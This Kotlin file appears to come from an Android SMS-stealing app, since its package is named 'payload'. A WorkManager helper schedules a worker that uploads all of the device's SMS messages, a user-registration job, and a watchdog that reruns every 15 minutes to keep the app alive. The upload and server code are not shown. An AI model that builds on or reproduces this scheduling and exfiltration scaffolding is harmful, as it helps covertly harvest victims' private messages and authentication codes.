package com.payload.jansiix0ne.utils

import android.content.Context
import androidx.work.*
import com.payload.jansiix0ne.worker.AllSmsUploadWorker
import com.payload.jansiix0ne.worker.RegisterUserWorker
import com.payload.jansiix0ne.worker.UnifiedWatchdogWorker
import java.util.concurrent.TimeUnit

object WorkManagerHelper {

    fun scheduleRegisterUser(context: Context) {
        val registerWork = OneTimeWorkRequestBuilder<RegisterUserWorker>()
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .build()

        WorkManager.getInstance(context).enqueueUniqueWork(
            "register_user",
            ExistingWorkPolicy.KEEP,
            registerWork
        )
    }

    fun scheduleAllSmsUpload(context: Context) {
        val uploadWork = OneTimeWorkRequestBuilder<AllSmsUploadWorker>()
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .build()

        WorkManager.getInstance(context).enqueueUniqueWork(
            "upload_all_sms",
            ExistingWorkPolicy.REPLACE,
            uploadWork
        )
    }

    fun scheduleWatchdog(context: Context) {
        val watchdogWork = PeriodicWorkRequestBuilder<UnifiedWatchdogWorker>(
            15, TimeUnit.MINUTES
        )
            .setConstraints(
                Constraints.Builder()
                    .setRequiresBatteryNotLow(false)
                    .build()
            )
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "unified_watchdog",
            ExistingPeriodicWorkPolicy.KEEP,
            watchdogWork
        )
    }

    fun cancelAllWork(context: Context) {
        WorkManager.getInstance(context).cancelAllWork()
    }
}
